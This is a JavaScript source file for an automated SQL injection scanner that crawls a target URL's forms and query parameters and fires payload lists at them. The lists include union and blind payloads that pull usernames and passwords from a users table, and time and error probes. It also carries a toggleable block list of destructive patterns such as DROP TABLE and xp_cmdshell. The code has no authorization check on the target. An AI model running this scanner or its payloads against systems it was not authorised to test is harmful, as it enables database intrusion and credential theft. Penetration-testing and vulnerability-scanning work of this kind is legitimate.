// src/core/services/sqlInjectionService.js
const axios = require('axios');
const cheerio = require('cheerio');
const { v4: uuidv4 } = require('uuid');
const logger = require('../../utils/logger');
const config = require('../../config');

class SqlInjectionService {
  constructor() {
    this.safeMode = true;
    this.activeScans = new Map();

    this.payloads = {
      basic: ["' OR '1'='1", "' OR 1=1 --", "admin'--"],
      union: ["' UNION SELECT null,username,password FROM users--", "' UNION SELECT 1,@@version,3--"],
      error: ["' AND 1=CONVERT(int,@@version)--", "' AND 1=1/0--"],
      time: ["' OR IF(1=1,SLEEP(5),0)--", "' OR (SELECT * FROM (SELECT(SLEEP(5)))--"],
      blind: ["' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--"]
    };

    this.destructivePatterns = [
      /DROP\s+TABLE/i,
      /DELETE\s+FROM/i,
      /TRUNCATE\s+TABLE/i,
      /xp_cmdshell/i
    ];

    this.errorSignatures = [
      /error in your SQL syntax/i,
      /unexpected end of SQL command/i,
      /mysql_fetch_array\(\)/i,
      /syntax error/i,
      /SQL Server Native Client/i,
      /ODBC Driver/i,
      /PostgreSQL query failed/i,
      /ORA-\d{5}/i,
      /Warning: mysql/i
    ];
  }

  async scan(url, options = {}) {
    const scanId = uuidv4();
    const scanData = {
      id: scanId,
      target: url,
      status: 'running',
      startTime: new Date(),
      endTime: null,
      currentTest: 'Starting scan',
      results: [],
      stats: { injectionPoints: 0, totalTests: 0, vulnerabilitiesFound: 0 }
    };
    this.activeScans.set(scanId, scanData);
    logger.info(`[SQLi][${scanId}] Scan started for ${url}`);

    try {
      const page = await this._fetchPage(url);
      const $ = cheerio.load(page.data);
      const injectionPoints = this._findInjectionPoints($, url);
      scanData.stats.injectionPoints = injectionPoints.length;

      if (injectionPoints.length === 0) {
        scanData.results.push({ message: 'No injection points found' });
        logger.warn(`[SQLi][${scanId}] No injection points found`);
      }

      const payloads = this._getPayloadsForScan(options.scanType || 'basic');
      scanData.stats.estimatedTotal = injectionPoints.length * payloads.length;

      for (const point of injectionPoints) {
        if (scanData.status !== 'running') break;
        scanData.currentTest = `Testing point ${point.url} with method ${point.method}`;
        const pointResults = [];

        for (const payload of payloads) {
          if (scanData.status !== 'running') break;
          if (this.safeMode && this._isDestructivePayload(payload)) {
            pointResults.push({ payload, status: 'blocked', isVulnerable: false, error: 'Safe mode blocked' });
            continue;
          }
          scanData.stats.totalTests++;

          const testResult = await this._testPayload(point, payload, options.scanType);
          if (testResult.isVulnerable) scanData.stats.vulnerabilitiesFound++;
          pointResults.push(testResult);
        }
        scanData.results.push({ point, results: pointResults });
      }

      scanData.status = scanData.status === 'running' ? 'completed' : scanData.status;
      scanData.endTime = new Date();
      logger.info(`[SQLi][${scanId}] Scan ${scanData.status}`);

      return scanData;
    } catch (error) {
      scanData.status = 'failed';
      scanData.error = error.message;
      scanData.endTime = new Date();
      logger.error(`[SQLi][${scanId}] Scan failed: ${error.message}`);
      throw error;
    } finally {
      this.activeScans.set(scanId, scanData);
    }
  }

  async _fetchPage(url) {
    const timeout = config.sqlInjection?.timeout || 10000;
    try {
      const response = await axios.get(url, { timeout, validateStatus: () => true });
      return response;
    } catch (e) {
      logger.error(`_fetchPage error: ${e.message}`);
      throw new Error(`Failed to fetch page: ${e.message}`);
    }
  }

  _findInjectionPoints($, baseUrl) {
    const points = [];

    $('form').each((_, form) => {
      const $form = $(form);
      const action = $form.attr('action') || '';
      const method = ($form.attr('method') || 'POST').toUpperCase();

      const inputs = [];
      $form.find('input, textarea, select').each((_, input) => {
        const name = $(input).attr('name');
        if (!name) return;
        inputs.push({ name, type: $(input).attr('type') || 'text', value: $(input).attr('value') || '' });
      });

      if (inputs.length) points.push({ type: 'form', url: new URL(action, baseUrl).href, method, inputs });
    });

    const urlObj = new URL(baseUrl);
    for (const [name, value] of urlObj.searchParams.entries()) {
      points.push({ type: 'url_parameter', url: baseUrl, method: 'GET', inputs: [{ name, type: 'parameter', value }] });
    }

    return points;
  }

  async _testPayload(point, payload, scanType) {
    const result = { payload, isVulnerable: false, status: 'tested', error: null };

    try {
      const response = await this._makeRequest(point, payload);

      // Check error-based vulnerabilities
      if (this._detectErrorSignature(response.data)) {
        result.isVulnerable = true;
        result.status = 'vulnerable (error-based)';
        return result;
      }

      // Check time-based vulnerability (if scanType includes time)
      if (scanType === 'time' || scanType === 'full') {
        const vulnerable = await this._checkTimeBased(point, payload);
        if (vulnerable) {
          result.isVulnerable = true;
          result.status = 'vulnerable (time-based)';
          return result;
        }
      }

      // Check boolean-based vulnerability (if scanType includes blind/boolean)
      if (scanType === 'blind' || scanType === 'full') {
        const vulnerable = await this._checkBooleanBased(point, payload);
        if (vulnerable) {
          result.isVulnerable = true;
          result.status = 'vulnerable (boolean-based)';
          return result;
        }
      }

      result.status = 'not vulnerable';
      return result;

    } catch (err) {
      result.status = 'error';
      result.error = err.message;
      return result;
    }
  }

  async _makeRequest(point, payload) {
    const timeout = config.sqlInjection?.timeout || 10000;
    const method = point.method.toLowerCase();

    if (method === 'post') {
      const data = {};
      for (const input of point.inputs) {
        data[input.name] = input.type === 'hidden' ? input.value : payload;
      }
      return axios.post(point.url, new URLSearchParams(data).toString(), {
        timeout,
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
      });
    } else {
      // GET
      const urlObj = new URL(point.url);
      for (const input of point.inputs) {
        urlObj.searchParams.set(input.name, input.type === 'hidden' ? input.value : payload);
      }
      return axios.get(urlObj.href, { timeout });
    }
  }

  _detectErrorSignature(body) {
    if (typeof body !== 'string') return false;
    return this.errorSignatures.some(regex => regex.test(body));
  }

  async _checkTimeBased(point, payload) {
    const start = Date.now();
    await this._makeRequest(point, payload);
    const duration = Date.now() - start;
    return duration > 4500; // customizable threshold
  }

  async _checkBooleanBased(point, payload) {
    // Payloads true and false variants
    const truePayload = payload;
    const falsePayload = payload.replace(/1'='1/g, "1'='2'").replace(/1=1/g, "1=2");

    const baselineRes = await this._makeRequest(point, 'baseline');
    const trueRes = await this._makeRequest(point, truePayload);
    const falseRes = await this._makeRequest(point, falsePayload);

    const baselineLen = baselineRes.data?.length || 0;
    const trueLen = trueRes.data?.length || 0;
    const falseLen = falseRes.data?.length || 0;

    return trueLen !== baselineLen && falseLen === baselineLen;
  }

  _getPayloadsForScan(scanType) {
    if (scanType === 'full') return Object.values(this.payloads).flat();
    return this.payloads[scanType] || this.payloads.basic;
  }

  _isDestructivePayload(payload) {
    return this.destructivePatterns.some(pattern => pattern.test(payload));
  }

  toggleSafeMode() {
    this.safeMode = !this.safeMode;
    logger.info(`Safe mode ${this.safeMode ? 'activated' : 'deactivated'}`);
    return this.safeMode;
  }

  getScanStatus(scanId) {
    return this.activeScans.get(scanId);
  }

  cancelScan(scanId) {
    const scan = this.activeScans.get(scanId);
    if (scan && scan.status === 'running') {
      scan.status = 'cancelled';
      this.activeScans.set(scanId, scan);
      logger.info(`Scan ${scanId} cancelled`);
      return true;
    }
    return false;
  }
}

module.exports = new SqlInjectionService();
